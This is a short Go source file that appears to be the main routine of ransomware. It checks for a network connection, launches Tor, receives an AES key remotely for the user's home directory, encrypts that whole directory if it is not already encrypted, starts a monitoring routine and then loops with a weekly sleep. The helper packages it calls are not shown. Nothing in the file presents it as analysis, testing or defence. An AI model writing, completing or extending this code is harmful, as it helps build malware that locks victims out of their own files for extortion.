package main

import (
	"core"
	"networking"
    "os"
    "tor"
    "time"
)

func main() {
	if !networking.CheckConnection() {
		return
	 }

	target, _ := os.UserHomeDir()
    tor.RunTor(target)

    if !core.IsEncrypted(target) {
        aesKey := networking.ReceiveAESKey(target)
	    core.EncryptDir(target, aesKey)
    }

    core.MonitoringTheMonitor(target)

    for {
        time.Sleep(168 * time.Hour)
    }
}
